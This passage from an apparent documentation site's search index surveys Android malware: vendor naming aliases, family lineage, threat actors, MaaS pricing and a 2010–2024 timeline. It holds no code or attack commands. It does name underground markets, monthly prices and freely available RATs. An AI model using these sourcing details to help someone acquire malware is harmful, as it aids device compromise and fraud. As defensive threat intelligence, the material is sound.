Trojan-Spy.AndroidOS.KoSpy - APT37/ScarCruft spyware AridSpy - Trojan-Spy.AndroidOS.AridSpy Android/Spy.AridSpy Arid Viper/APT-C-23 GuardZoo - Trojan-Spy.AndroidOS.GuardZoo - Modified Dendroid RAT LightSpy - Trojan-Spy.AndroidOS.LightSpy Android/Spy.LightSpy DragonEgg (Lookout), WyrmSpy (related) EagleMsgSpy - - - Wuhan Chinasoft Token lawful intercept BoneSpy - Trojan-Spy.AndroidOS.BoneSpy - DroidWatcher derivative, Sandcat PlainGnome - Trojan-Spy.AndroidOS.PlainGnome - Sandcat, companion to BoneSpy DCHSpy - Trojan-Spy.AndroidOS.DCHSpy - MuddyWater/MOIS surveillanceware FireScam - Trojan-Spy.AndroidOS.FireScam - Fake RuStore/Telegram Premium PJobRAT - Trojan-Spy.AndroidOS.PJobRAT - - Rafel RAT - Trojan-Spy.AndroidOS.RafelRAT - Open-source RAT BTMOB RAT - Trojan-Spy.AndroidOS.BTMob - CraxRAT/SpySolr lineage, MaaS RAT"},{"location":"malware/naming-conventions/#common-confusion-cases","title":"Common Confusion Cases","text":"<p>Families that are frequently confused due to overlapping names, shared code, or vendor disagreements:</p> Usually Called Also Known As Actual Relationship Anatsa TeaBot Same family. ThreatFabric named it Anatsa, other researchers called it TeaBot. Alien Cerberus v2 Distinct fork. Built on Cerberus code but with significant additions. Not merely a version update. Ermac Cerberus v3 Distinct fork by DukeEugene. Shares Cerberus DNA but different operator and added features. Hook Ermac v3 Evolution. DukeEugene marketed it as new, but ThreatFabric proved it contains all Ermac code plus new commands. Octo ExobotCompact, Coper Same lineage. Exobot (2016) -&gt; ExobotCompact (2021) -&gt; Coper -&gt; Octo (2022) -&gt; Octo2 (2024). Hydra BianLian Distinct families. Hydra was initially tracked alongside a dropper called BianLian (not the ransomware group). Medusa TangleBot Same family. ThreatFabric named it Medusa, Proofpoint called it TangleBot. BRATA AmexTroll Same lineage. BRATA rebranded/evolved, AmexTroll is a later variant. Copybara BRATA v3 Related but distinct. Evolved from BRATA codebase, but Cleafy tracked it as separate. Cabassous FluBot Same family. Kaspersky's detection name (Cabassous) vs common research name (FluBot). Cebruser Cerberus Same family. Kaspersky detection name is \"Cebruser\" instead of \"Cerberus\". Piom Hydra Same family. Kaspersky's detection name for Hydra samples. Wroba MoqHao Same family. Kaspersky uses \"Wroba,\" McAfee uses \"MoqHao,\" campaign tracked as \"Roaming Mantis.\" XLoader MoqHao Same family. Some vendors use XLoader for MoqHao/Wroba variants. Frogblight Coper variant? Possible relationship. Kaspersky notes possible connection to Coper/Octo lineage. GoldPickaxe GoldDigger Related but distinct. GoldFactory group operates GoldDigger, GoldPickaxe (Android + iOS), and Gigabud. GoldPickaxe adds facial biometric theft. Gigabud GoldDigger, Gigaflower Same GoldFactory group. Shares code (<code>libstrategy.so</code>) and Virbox packer with GoldDigger. Gigaflower is a pre-release successor. LightSpy DragonEgg, WyrmSpy DragonEgg is Lookout's name for the Android variant. ThreatFabric linked it to LightSpy iOS. WyrmSpy may be a related successor. BoneSpy Gamaredon mobile Initially attributed to Gamaredon (FSB), reattributed to Sandcat (Uzbekistan SSS). BingoMod BRATA variant? Behavioral similarity (post-fraud device wipe) but independent codebase per Cleafy analysis. NGate NFCGate NGate uses the NFCGate academic tool for NFC relay. NFCGate itself is a legitimate security research tool. TrickMo TrickBot mobile Originally a companion to TrickBot desktop trojan. The 2024 resurgence operates independently with no TrickBot dependency. Antidot AppLite AppLite is an Antidot variant (Zimperium naming) targeting corporate employees. Same family, different distribution strategy."},{"location":"malware/naming-conventions/#how-to-cross-reference","title":"How to Cross-Reference","text":""},{"location":"malware/naming-conventions/#online-resources","title":"Online Resources","text":"<ul> <li>Malpedia maintains a malware reference database with aliases across vendors</li> <li>MISP Galaxy provides structured threat intelligence clusters with cross-vendor mapping</li> <li>VirusTotal shows detection names from 60+ AV engines for any sample</li> <li>MITRE ATT&amp;CK Software lists known aliases for documented malware families</li> <li>bazaar.abuse.ch malware sample database with multi-vendor tagging</li> </ul>"},{"location":"malware/naming-conventions/#by-indicator","title":"By Indicator","text":"<p>When vendor names don't match, correlate by:</p> Indicator Method C2 infrastructure Same C2 domains/IPs across reports from different vendors Code overlap Shared class names, string constants, obfuscation patterns Certificate Same signing certificate across samples Package name patterns Similar package naming schemes (e.g., <code>com.xyz.abc</code> patterns) Botnet panel Same C2 panel framework (often leaked or reused) String artifacts Unique strings, error messages, or debug output Network protocol Identical C2 protocol structure, encryption methods, API endpoints"},{"location":"malware/naming-conventions/#practical-workflow","title":"Practical Workflow","text":"<p>When you encounter an unfamiliar name in a report:</p> <ol> <li>Search Malpedia for the name to find aliases</li> <li>Check the vendor's detection name format against the tables above</li> <li>Search VirusTotal for a known sample hash from the report, check other vendor names</li> <li>Look for C2 infrastructure overlap with known families</li> <li>Check this page's confusion cases table</li> </ol>"},{"location":"malware/naming-conventions/#lineage-and-code-reuse","title":"Lineage and Code Reuse","text":"<p>Android malware families frequently share code. Understanding why helps predict capability overlap.</p> Reason Example Source code leak Cerberus leaked September 2020, spawned Alien, Ermac, Hook Source code leak Anubis leaked after developer arrest, code reused in GodFather Source code leak SpyNote v6.4 leaked, thousands of operators globally MaaS rebranding Same operator sells under new name: Ermac -&gt; Hook (both DukeEugene) Developer overlap Same developers work on multiple projects across families Direct evolution Exobot -&gt; ExobotCompact -&gt; Coper -&gt; Octo -&gt; Octo2 Regional adaptation BRATA (Brazil) -&gt; Copybara (Italy) Feature fork TgToxic (SE Asia) -&gt; ToxicPanda (EU/LATAM) <p>This means \"family\" boundaries are often blurry. Two samples with different names may share 80% of their code. The Families section documents these relationships for each family.</p>"},{"location":"malware/threat-actors/","title":"Threat Actors","text":"<p>The Android malware ecosystem is operated by distinct categories of threat actors ranging from nation-state intelligence agencies to solo developers selling RAT builders on Telegram. Understanding who builds and deploys Android malware, and why, is essential for attribution, threat modeling, and predicting what comes next.</p>"},{"location":"malware/threat-actors/#maas-operators-malware-as-a-service","title":"MaaS Operators (Malware-as-a-Service)","text":"<p>The dominant business model in Android banking malware. A developer builds and maintains the malware, panel, and inject kits. Operators rent access on a monthly subscription and deploy the malware against their own target set. The developer provides updates, support, and evasion patches through private Telegram channels.</p>"},{"location":"malware/threat-actors/#business-model","title":"Business Model","text":"<ol> <li>Developer advertises on underground forums (XSS, Exploit.in) and Telegram</li> <li>Operator pays monthly subscription for panel access, APK builder, and inject kit</li> <li>Operator handles distribution: smishing campaigns, Play Store droppers, social engineering</li> <li>Stolen credentials flow through the panel to the operator</li> <li>Operator monetizes via money mule networks, SIM swaps, or direct account takeover</li> <li>Developer earns recurring revenue from multiple simultaneous operators</li> </ol> <p>The developer-operator split means a single malware family may target different countries simultaneously depending on which operators are active. Attribution to a specific criminal group requires identifying the operator, not just the malware family.</p>"},{"location":"malware/threat-actors/#pricing","title":"Pricing","text":"<p>Prices sourced from underground advertisements and open-source threat intelligence reporting. See MaaS Economy for full market context.</p> Family Monthly Price Key Features Developer / Group Hook $7,000 VNC, RAT, accessibility abuse, keylogging DukeEugene BTMOB RAT $5,000-$10,000 Evolved from CraxRAT/SpySolr lineage Unknown Cerberus $4,000 (pre-leak) Overlays, keylogging, 2FA theft Leaked September 2020 Ermac $3,000 Fork of Alien/Cerberus, 467 inject targets DukeEugene GodFather $3,000-$5,000 (est.) Overlays, VNC, VirtualApp sandboxing Unknown (Anubis lineage) Octo / Octo2 $2,000 Remote access, keylogging, DGA in v2 \"Architect\" (Octo2) Xenomorph $2,000-$3,000 (est.) ATS engine, 400+ bank targets Hadoken Security Group Medusa $2,000-$4,000 (est.) VNC, keylogging, minimal permissions in v2 Multiple operators Anatsa Private (not publicly sold) ATS-based, Play Store droppers Unknown Albiriox $650-$720 Budget tier, basic overlay + keylogging Unknown"},{"location":"malware/threat-actors/#infrastructure","title":"Infrastructure","text":"Component Typical Setup Sales channel Private Telegram groups, XSS Forum, Exploit.in C2 hosting Bulletproof hosting providers, frequently rotated domains Panel PHP/Laravel web app, sometimes hardened with IP whitelisting Builder Desktop or web-based APK generator with obfuscation options Inject kits HTML/CSS overlay pages, sold per-bank or as regional bundles Money flow Cryptocurrency (Monero preferred, Bitcoin accepted), Telegram escrow Support 24/7 Telegram support channel, update announcements, bug tracking"},{"location":"malware/threat-actors/#maas-lineage-chains","title":"MaaS Lineage Chains","text":"<p>MaaS families are interconnected through source leaks, developer movement, and direct evolution:</p> <pre><code>graph LR\n    Cerberus[\"Cerberus (DukeEugene, 2019)\"] --&gt;|source leak| Alien[\"Alien (2020)\"]\n    Alien --&gt;|DukeEugene| Ermac[\"Ermac (2020)\"]\n    Ermac --&gt; Hook[\"Hook (2022)\"]\n    Cerberus --&gt;|source leak| Variants[\"dozens of unnamed variants\"]\n\n    BankBot[\"BankBot (open source, 2016)\"] --&gt;|influence| Anubis[\"Anubis (2018)\"]\n    Anubis --&gt;|source leak| GodFather[\"GodFather (2022)\"]\n\n    Exobot[\"Exobot (2016)\"] --&gt; ExobotCompact\n    ExobotCompact --&gt; Coper\n    Coper --&gt; Octo[\"Octo (2022)\"]\n    Octo --&gt; Octo2[\"Octo2 (2024)\"]\n\n    CraxRAT --&gt; SpySolr\n    SpySolr --&gt; BTMOB[\"BTMOB RAT (2025)\"]</code></pre> <p>The Cerberus leak was the most consequential single event. It seeded multiple families and lowered the barrier for new entrants. Any sample with Cerberus-derived code may be operated by entirely unrelated groups.</p>"},{"location":"malware/threat-actors/#state-sponsored-apt","title":"State-Sponsored / APT","text":"<p>Government-backed actors deploying Android malware for intelligence collection, surveillance of dissidents and journalists, or military operations. Capabilities range from zero-click exploits to basic RATs, depending on the actor's resources and objectives.</p>"},{"location":"malware/threat-actors/#commercial-spyware-vendors","title":"Commercial Spyware Vendors","text":"<p>These companies develop and sell mobile exploitation tools to government clients. They occupy a legal gray area: marketed as \"lawful intercept\" tools, but repeatedly documented targeting journalists, activists, and political opposition.</p> Vendor Country Product Status Family Page NSO Group Israel Pegasus Active, US Entity List since 2021 Pegasus Cytrox / Intellexa North Macedonia / Ireland Predator Sanctioned by US Treasury 2024, fragmented operations Predator Gamma Group / FinFisher UK / Germany FinSpy Bankrupt 2022, some operations may continue under different entities FinSpy Paragon Solutions Israel Graphite Active, less publicly documented than NSO QuaDream Israel Reign Shut down April 2023 after Citizen Lab / Microsoft exposure Candiru Israel DevilsTongue US Entity List since 2021, primarily Windows/browser focused <p>NSO Group (Pegasus): The benchmark for mobile exploitation. Zero-click exploit chains targeting iMessage, WhatsApp, and Android browser engines. Sold to 40+ government clients. Documented on the phones of heads of state, journalists (Jamal Khashoggi associates), human rights defenders, and opposition politicians across dozens of countries. See Pegasus for full technical analysis.</p> <p>Cytrox/Intellexa (Predator): One-click exploit chains delivered via links. Intellexa Consortium operated across multiple EU jurisdictions to evade export controls. Google TAG documented Predator exploiting five Android zero-days in 2021 (CVE-2021-37973, CVE-2021-37976, CVE-2021-38000, CVE-2021-38003, CVE-2021-1048). US Treasury sanctions in March 2024 targeted individuals and entities in the consortium. See Predator.</p> <p>Gamma Group (FinSpy/FinFisher): Sold to governments including Ethiopia, Bahrain, and Turkey for targeting dissidents. FinSpy Android implant used accessibility abuse, root exploits, and DexClassLoader for modular payload delivery. FinFisher GmbH filed for insolvency in 2022 after sustained legal pressure. See FinSpy.</p>"},{"location":"malware/threat-actors/#nation-state-groups","title":"Nation-State Groups","text":"Group Nation Primary Targets Android Tools MuddyWater / MOIS Iran Iranian dissidents, regional adversaries DCHSpy targeting Iranian citizens via fake VPN apps Gamaredon / Primitive Bear Russia (FSB) Ukrainian military, government officials BoneSpy, PlainGnome targeting Ukrainian military personnel Sandworm / Seashell Blizzard Russia (GRU) Ukrainian infrastructure, NATO Limited Android operations, primarily infrastructure-focused APT-C-23 / Arid Viper Palestine (Hamas-linked) Israeli and Palestinian targets AridSpy via trojanized messaging apps Transparent Tribe / APT36 Pakistan (ISI-linked) Indian military and government PJobRAT, CapraRAT targeting Indian defense personnel ScarCruft / APT37 North Korea South Korean defectors, journalists RambleOn, FastViewer targeting South Korean users Sun Team North Korea North Korean defectors RedDawn campaign: fake apps on Google Play stealing photos, contacts, SMS. Also targeted via KakaoTalk social engineering. Kimsuky / APT43 North Korea South Korean think tanks, diplomats KoSpy via fake utility apps Houthi-linked operators Yemen Yemeni military targets GuardZoo via trojanized mapping apps Chinese PSB (Public Security Bureau) China Domestic surveillance, Uyghurs, Tibetans EagleMsgSpy, custom surveillance tools"},{"location":"malware/threat-actors/#attribution-challenges","title":"Attribution Challenges","text":"<p>State-sponsored Android malware attribution is complicated by several factors:</p> <ul> <li>Commercial spyware is sold to many governments, so discovering Pegasus on a device does not identify which government deployed it without infrastructure analysis</li> <li>Nation-state groups frequently use modified open-source tools (Metasploit, SpyNote forks) that are also used by criminals</li> <li>Infrastructure overlaps occur when groups share bulletproof hosting providers or VPN services</li> <li>False flag operations deliberately mimic other groups' tooling and infrastructure</li> <li>The line between \"state-sponsored\" and \"state-tolerated\" is blurred, particularly for Russian and Chinese operations where criminal groups operate with implicit government permission</li> </ul>"},{"location":"malware/threat-actors/#regional-criminal-groups","title":"Regional Criminal Groups","text":"<p>Organized cybercrime groups operating Android malware with specific regional targeting. These groups are more sophisticated than solo developers but typically focused on a single malware family or geographic region.</p>"},{"location":"malware/threat-actors/#goldfactory","title":"GoldFactory","text":"<p>Origin: China-nexus, targeting Southeast Asia and APAC.</p> <p>Operations: Develops and operates banking trojans targeting Thai, Vietnamese, and broader APAC financial institutions. Uses Virbox commercial packer for anti-analysis. Known for combining traditional banking trojan techniques with biometric theft.</p> <p>Families:</p> <ul> <li>Gigabud: Android banking trojan targeting Thai and APAC banks, Virbox-packed, overlay attacks with screen recording</li> <li>GoldPickaxe: Steals facial biometrics to bypass bank liveness checks in Thailand and Vietnam, also targets iOS via MDM profiles</li> </ul> <p>Distinguishing traits: Heavy use of commercial packers, biometric theft as a differentiator, cross-platform (Android + iOS) operations.</p>"},{"location":"malware/threat-actors/#hadoken-security-group","title":"Hadoken Security Group","text":"<p>Origin: Believed European-based.</p> <p>Operations: Developed and operated Xenomorph as a MaaS offering. The group progressed from basic overlay banking trojan to a full ATS (Automated Transfer System) engine with 400+ bank targets across Europe, US, and APAC.</p> <p>Families:</p> <ul> <li>Xenomorph: Three major versions. v1 (2022) basic overlays. v2 added C2 protocol updates. v3 (2023) introduced ATS engine for automated on-device fraud.</li> </ul> <p>Distinguishing traits: Rapid iteration cycle, public-facing development activity, transitioned from MaaS to potentially operating independently.</p>"},{"location":"malware/threat-actors/#dukeeugene","title":"DukeEugene","text":"<p>Origin: Russian-speaking threat actor.</p> <p>Operations: The most prolific single developer in the Android MaaS ecosystem. Created Cerberus (2019), attempted to auction the source code, then leaked it for free when the auction failed (September 2020). Subsequently developed Ermac (2020) and Hook (2022), each building on the previous codebase with new features. Advertised and sold through Telegram and underground forums.</p> <p>Families:</p> <ul> <li>Cerberus: Original MaaS banking trojan, overlay attacks, keylogging</li> <li>Ermac: Cerberus fork via Alien, 467 banking app targets</li> <li>Hook: Premium-tier evolution with VNC, RAT, $7,000/month</li> </ul> <p>Distinguishing traits: Consistent code lineage across three families, premium pricing strategy, prolific advertising on underground forums.</p>"},{"location":"malware/threat-actors/#neo_net","title":"Neo_Net","text":"<p>Origin: Spanish-speaking operator (Mexico-based per research).</p> <p>Operations: Targeted Spanish and Latin American banks with relatively simple SMS phishing campaigns combined with Android malware. Despite using unsophisticated tools, successfully compromised thousands of victims. Operated from 2021 through at least 2023.</p> <p>Distinguishing traits: Low technical sophistication compensated by high-volume social engineering, Spanish-language targeting, combined smishing with credential-stealing APKs.</p>"},{"location":"malware/threat-actors/#roaming-mantis","title":"Roaming Mantis","text":"<p>Origin: East Asian threat group (China-nexus suspected).</p> <p>Operations: Long-running operation primarily targeting Japan and South Korea through massive smishing campaigns. Known for DNS hijacking on compromised routers to redirect victims to malicious APK downloads. Operations expanded to Europe and other regions over time.</p> <p>Families:</p> <ul> <li>MoqHao (also known as Wroba, XLoader): SMS worm with banking credential theft, DNS hijacking, multi-region targeting</li> </ul> <p>Distinguishing traits: SMS-based propagation (worm-like behavior), DNS hijacking for distribution, long operational lifespan (active since 2018+), geographic expansion from East Asia to global.</p>"},{"location":"malware/threat-actors/#brata-copybara-operators","title":"BRATA / Copybara Operators","text":"<p>Origin: Italian-focused criminal group(s).</p> <p>Operations: Evolved from the original BRATA banking trojan (Brazilian origin, later repurposed for Italian banks) to the Copybara family targeting Italian financial institutions. Primarily uses vishing (voice phishing / TOAD - Telephone-Oriented Attack Delivery) for distribution, calling victims while impersonating bank staff.</p> <p>Families:</p> <ul> <li>BRATA: Factory reset after fraud, GPS tracking, SMS interception</li> <li>Copybara: VNC-based on-device fraud, Italian bank targeting</li> <li>ToxicPanda: Further evolution targeting Italian and Latin American banks</li> </ul> <p>Distinguishing traits: Vishing-based distribution, Italy-focused targeting, progressive code evolution across three named families, factory reset as anti-forensic technique.</p>"},{"location":"malware/threat-actors/#inthebox","title":"InTheBox","text":"<p>Origin: Russian-speaking threat actor.</p> <p>Operations: Not a malware developer but the dominant inject kit vendor in the Android MaaS ecosystem. Sells HTML overlay pages (webinjects) that mimic banking apps, crypto wallets, and payment platforms. Operates a dedicated marketplace offering per-bank and bundled inject kits compatible with major MaaS families.</p> <p>Distinguishing traits: Specialization in inject kits rather than malware itself, supply chain role supporting multiple MaaS operators, 1,000+ banking app overlays in catalog.</p>"},{"location":"malware/threat-actors/#solo-developers-small-teams","title":"Solo Developers / Small Teams","text":"<p>Individual developers or small teams building and selling Android RATs and malware through Telegram and underground forums. Lower sophistication than MaaS operations but responsible for a significant volume of infections due to low cost and accessibility.</p>"},{"location":"malware/threat-actors/#open-source-leaked-tool-ecosystem","title":"Open Source / Leaked Tool Ecosystem","text":"Tool Status Usage Rafel RAT Open source on GitHub Widely used by low-skill operators, Check Point documented 120+ campaigns using Rafel SpyNote (cracked) Leaked/cracked builder circulating freely Originally commercial ($200-$500), cracked versions enable mass adoption AhMyth Open source Academic RAT project repurposed for malicious use L3MON Open source Node.js-based Android RAT, simple deployment AndroRAT Open source One of the earliest Android RATs, still used in modified forms CraxRAT Cracked builder Evolved into SpySolr and BTMOB RAT <p>The availability of free and cracked tools means that anyone with basic technical skills can deploy an Android RAT. The resulting infections are typically unsophisticated but high-volume. Check Point's research on Rafel RAT found it deployed against military targets, government entities, and ordinary users across 120+ campaigns, demonstrating that even basic tools can reach high-value targets through social engineering.</p>"},{"location":"malware/threat-actors/#telegram-based-operations","title":"Telegram-Based Operations","text":"<p>Telegram is the primary marketplace and communication channel for small-scale Android malware operations:</p> <ul> <li>Builder sales: Developers sell RAT builders for $50-$500 one-time or $20-$100/month</li> <li>Cracked tools: Channels distribute cracked versions of commercial tools</li> <li>Tutorials: Step-by-step guides for building and deploying Android malware</li> <li>Victim logs: Operators share screenshots of active bots as proof of capability</li> <li>Mule recruitment: Money mule and drop account recruitment for monetization</li> </ul>"},{"location":"malware/threat-actors/#devixor","title":"DeVixor","text":"<p>A notable example of a solo developer operating publicly. The DeVixor developer shares development updates, feature additions, and victim statistics on Telegram. Targets Iranian users through fake VPN apps, exploiting demand for censorship circumvention tools. The public nature of the operation illustrates the low perceived risk for operators in certain jurisdictions.</p>"},{"location":"malware/threat-actors/#data-harvesting-operations","title":"Data Harvesting Operations","text":"<p>Not traditional malware operators but commercial entities conducting data collection at scale through SDK integration, ad-tech infrastructure, and dual-use applications. These operations collect more data from more devices than most malware campaigns, but operate under the cover of privacy policies and terms of service.</p> <p>Detailed coverage in Grayware &amp; Data Harvesting.</p>"},{"location":"malware/threat-actors/#key-actors","title":"Key Actors","text":"Entity Method Scale Status X-Mode / Outlogic Location SDK in 400+ apps Millions of devices FTC action 2024 Measurement Systems Data harvesting SDK 60M+ downloads Removed from Play Store 2022, reappeared Gravy Analytics RTB data + SDKs Millions of devices Hacked January 2025, data exposed Sensor Tower VPN apps as data collection Millions of devices Exposed by BuzzFeed 2020 Patternz / ISA Ad network as surveillance front Claims 600K app reach Exposed 2024 Predicio Location SDK Unknown scale Linked to Gravy Analytics breach"},{"location":"malware/threat-actors/#overlap-with-state-actors","title":"Overlap with State Actors","text":"<p>The data harvesting ecosystem intersects with government surveillance in documented ways:</p> <ul> <li>X-Mode sold location data to US military contractors (DIA, through intermediaries)</li> <li>Measurement Systems SDK was linked to a Virginia company connected to Packet Forensics, a lawful intercept equipment vendor</li> <li>Babel Street (Locate X) purchased commercial location data for use by US government agencies including CBP and ICE</li> <li>The NSA and other intelligence agencies have acknowledged purchasing commercially available location data</li> <li>Patternz explicitly marketed SDK-sourced data for intelligence applications</li> </ul> <p>This creates a parallel surveillance channel that bypasses the legal frameworks governing traditional signals intelligence. Instead of intercepting communications through warranted collection, agencies purchase data that was \"consented to\" through app privacy policies that no one reads.</p>"},{"location":"malware/threat-actors/#attribution-resources","title":"Attribution Resources","text":"<p>Mapping samples to threat actors requires correlating technical indicators with operational patterns.</p> Indicator Type What It Reveals Code overlap / shared libraries Family lineage and developer identity C2 infrastructure (IP, domain, TLS cert) Operator identity, potentially shared across campaigns Inject kit style and target list Regional focus, possible inject kit vendor (InTheBox) Packer/obfuscation choice Developer preference, budget (commercial vs. free packers) Telegram channel artifacts Developer identity, customer base, operational schedule Language artifacts in code/panel Developer origin (Russian strings, Chinese comments, Farsi UI) Distribution pattern Operator methodology (smishing vs. Play Store vs. social engineering) Target list (banking apps) Geographic and financial sector focus of the operator Monetization method Mule networks suggest organized crime; data exfiltration suggests espionage"},{"location":"malware/threat-actors/#key-research-sources","title":"Key Research Sources","text":"Source Coverage ThreatFabric MaaS families, developer tracking, underground market monitoring Cleafy Italian/European banking trojans, vishing operations Citizen Lab Commercial spyware, state-sponsored surveillance Google TAG Zero-day exploitation, APT Android campaigns ESET Broad family coverage, APT campaigns Check Point RAT ecosystem, open-source tool tracking Kaspersky GReAT APT campaigns, particularly Russia/CIS-adjacent Cyble Underground monitoring, MaaS pricing Lookout Mobile APT, commercial spyware McAfee Mobile Research Korean/Indian market threats, ad fraud, MoqHao tracking, Sun Team attribution"},{"location":"malware/timeline/","title":"Android Malware Timeline","text":"<p>A chronological overview of Android malware evolution, from proof-of-concept trojans to sophisticated banking malware with automated fraud capabilities. Each era introduced techniques that became standard in later families.</p>"},{"location":"malware/timeline/#2010-2012-early-stage","title":"2010-2012: Early Stage","text":"<p>The Android malware landscape begins. Threats are simple, mostly SMS fraud and basic trojans.</p> Year Family Significance 2010 FakePlayer First known Android malware. Sent premium SMS messages. 2010 Geinimi First Android botnet. C2 communication, app repackaging for distribution. 2011 DroidDream First large-scale Play Store infection. Exploited root vulnerabilities (exploid, rageagainstthecage). ~250k downloads before removal. 2011 DroidKungFu Root exploit + payload download. Embedded encrypted payload decrypted at runtime. 2011 Plankton Aggressive adware framework. Demonstrated large-scale data harvesting without root. 2012 NotCompatible TCP proxy on infected devices. Used for click fraud and ticket scalping. <p>Era Summary</p> <p>Premium SMS fraud, root exploits, app repackaging, basic C2.</p>"},{"location":"malware/timeline/#2013-2015-ransomware-and-banking","title":"2013-2015: Ransomware and Banking","text":"<p>Banking trojans emerge. Ransomware arrives on mobile. Distribution through social engineering improves.</p> Year Family Significance 2013 Obad Most sophisticated to date: exploited device admin, SMS distribution, proxy chaining. 2013 Svpeng First mobile banking trojan to combine phishing overlays with SMS interception. 2014 Simplocker First Android ransomware with actual file encryption (AES). 2014 GM Bot Pioneered overlay attacks for credential theft. Source code leaked in 2016, spawning many variants. 2014 Koler Police-themed lockscreen ransomware. Used WebView for ransom display. 2015 SlemBunk Targeted 33 banking apps across multiple countries using overlays. <p>Era Summary</p> <p>Overlay attacks invented, device admin abuse, file encryption, SMS-based spreading.</p>"},{"location":"malware/timeline/#2016-2018-overlay-era","title":"2016-2018: Overlay Era","text":"<p>Overlay-based banking trojans become the dominant threat. Malware-as-a-service appears.</p> Year Family Significance 2016 BankBot Open-source banking trojan. Lowered the entry barrier for banking malware. Multiple Play Store appearances. 2016 Exobot Major MaaS banking trojan. Evolved into ExobotCompact/Octo. 2016 Marcher Major banking trojan targeting European banks. WebView-based overlays, credit card phishing. 2016 HummingBad 10M+ infections. Root exploits, ad fraud, app installation. Generated $300k/month in ad revenue. 2016 Triada Zygote-injecting trojan, later found pre-installed in firmware. System-level compromise. 2016 SpyNote Free RAT builder. Lowered barrier to entry for mobile surveillance. 2017 Red Alert 2.0 MaaS banking trojan. Telegram-based C2, blocklisted legitimate banking app notifications. 2017 LokiBot Banking trojan that transforms into ransomware if user tries to remove admin rights. 2017 Joker Premium subscription fraud via accessibility. Repeatedly bypassed Play Protect, thousands of Play Store variants over its lifetime. 2018 Anubis Full-featured banking trojan: overlays, keylogging, screen recording, file encryption. Repeatedly found on Play Store. 2018 MoqHao Roaming Mantis smishing operation. DNS hijacking, SMS propagation, targeting East Asia. <p>Era Summary</p> <p>WebView inject kits, MaaS model, Play Store infiltration via droppers, Telegram C2, supply chain compromise.</p>"},{"location":"malware/timeline/#2018-2020-accessibility-takeover","title":"2018-2020: Accessibility Takeover","text":"<p>Accessibility service becomes the primary weapon. Malware shifts from stealing credentials to controlling devices.</p> Year Family Significance 2018 Gustuff First \"automatic transfer system\" (ATS): used accessibility to fill banking app forms and initiate transfers without user interaction. 2019 Cerberus Major MaaS operation. Overlays, keylogging, 2FA theft, accessibility-based permission escalation. Source leaked in September 2020. 2019 Hydra Persistent MaaS banking trojan with broad affiliate network. TOR-based C2. 2019 BRATA Brazilian RAT with banking fraud and factory reset for evidence destruction. 2020 Alien Built on leaked Cerberus code. Added notification sniffer for 2FA codes, targeting expanded to 226 apps. 2020 FluBot SMS worm: spread by sending phishing SMS to victim's contacts. Rapid pan-European spread. Dismantled by Europol in 2022. 2020 Ermac Forked from Cerberus. Targeted 467 banking and crypto apps. Rented at $3k/month. 2020 GriftHorse Premium SMS fraud at scale. 10M+ victims, 200+ trojanized Play Store apps. 2020 Medusa Screen streaming + keylogging MaaS. Shared infrastructure with FluBot. <p>Era Summary</p> <p>ATS fraud, accessibility-based device control, Cerberus source leak spawning new families, SMS worm distribution.</p>"},{"location":"malware/timeline/#2021-2023-on-device-fraud","title":"2021-2023: On-Device Fraud","text":"<p>Full device control becomes standard. VNC-like capabilities. Malware operates banking apps directly.</p> Year Family Significance 2021 Anatsa ATS-focused banker. Play Store droppers with delayed payload delivery. Targeted European banks. 2021 SharkBot ATS without overlay: directly manipulates banking app UI via accessibility. DGA for C2 resilience. 2021 Vultur First banker to use VNC screen streaming (AlphaVNC) instead of overlays. 2021 Copybara Italian-focused banker distributed via vishing (TOAD). Evolved from BRATA. 2022 Xenomorph Three generations. v3 added full ATS framework with scripting engine for automating fraud across different banking apps. 2022 Hook Evolved from Ermac. Added VNC-like remote access, file manager, WhatsApp message exfiltration. MaaS at $7k/month. 2022 Octo Remote access via screen streaming + accessibility control. Lineage traces back to Exobot (2016). 2022 GodFather Anubis successor with dynamic overlays, 400+ targets, post-Soviet language kill switch. 2022 Fakecalls Korean banker intercepting outgoing calls to real bank numbers, replacing with recorded IVR audio. 2022 PixPirate Targets Brazil's Pix instant payment system. Invisible in app drawer. 2022 Zanubis Peruvian banking trojan targeting 40+ local financial apps with overlay attacks. 2023 Chameleon Banking trojan with biometric prompt bypass to force PIN entry for capture. 2023 Goldoson Malicious SDK in 60+ Play Store apps, 100M+ installs. Data harvesting + click fraud. 2023 FluHorse Flutter-based credential stealer targeting East Asia. Dart AOT compilation in <code>libapp.so</code> defeats standard Android decompilers. 2023 GoldDigger/GoldFactory Targeted Vietnamese and Thai banks. Variants include GoldPickaxe which collects facial biometric data to bypass bank face-verification. 2023 SpyNote/CypherRat Source code leak caused surge in global deployments. Evolved from RAT to banking trojan with overlays. <p>Era Summary</p> <p>VNC-like control, ATS scripting engines, anti-forensic device wipes, biometric data theft, biometric bypass, MaaS pricing escalation.</p>"},{"location":"malware/timeline/#2024-present-evolved-threats","title":"2024-Present: Evolved Threats","text":"<p>Continued sophistication. Multi-stage dropper chains. Geographic expansion. Reduced permission footprints to evade detection.</p> Year Family Significance 2024 Gigabud GoldFactory group. Screen recording instead of overlay attacks. Shared infrastructure with SpyNote, both Virbox-packed. 2024 Anatsa v2 Expanded to US banks. Multi-stage dropper chains using accessibility to bypass Android 13 restricted settings. 2024 Vultur v2 Added screen recording, remote access, file download/upload, app blocking. Uses encrypted C2 via Firebase Cloud Messaging. 2024 Octo 2 Major update: improved remote control stability, anti-analysis techniques, domain generation algorithm (DGA) for C2. 2024 Medusa v2 Reduced permission footprint from 21 to 5 permissions. Added dead drop resolvers on Telegram and X. 2024 ToxicPanda Evolved from TgToxic (Southeast Asia). Expanded to EU and Latin America. Chinese-speaking threat actor. 2024 Mamont Most active banking trojan of 2024 (36.70% of detections). Russia-exclusive, fake parcel-tracking distribution. 2024 Necro Supply chain trojan via compromised Coral SDK. 11M+ installs on Google Play. Steganographic payload delivery. 2024 MoqHao v2024 Auto-execution without user interaction. Runs immediately after installation. 2024 SparkCat First OCR-based stealer on both Play Store and App Store. Scans photos for crypto seed phrases. 2024 SpyAgent 280+ fake apps using OCR to steal crypto seed phrases from Korean users' photos. 2024 SoumniBot Korean banker exploiting manifest parsing differences to evade static analysis tools. 2024 SpyLoan Predatory loan apps, 8M+ installs, 75% infection increase Q2-Q3 2024. Data weaponized for extortion. 2024 Mandrake v2 Returned to Play Store undetected for 2 years with OLLVM-obfuscated native libraries. 2024 NGate First Android NFC relay malware. Clones payment cards via NFCGate for ATM cash withdrawal. Czech Republic campaign. 2024 BingoMod Banking trojan with VNC-based DTO and BRATA-like post-fraud device wipe. Romanian-speaking attribution. 2024 Brokewell Full device takeover banker by \"Baron Samedit Marais.\" 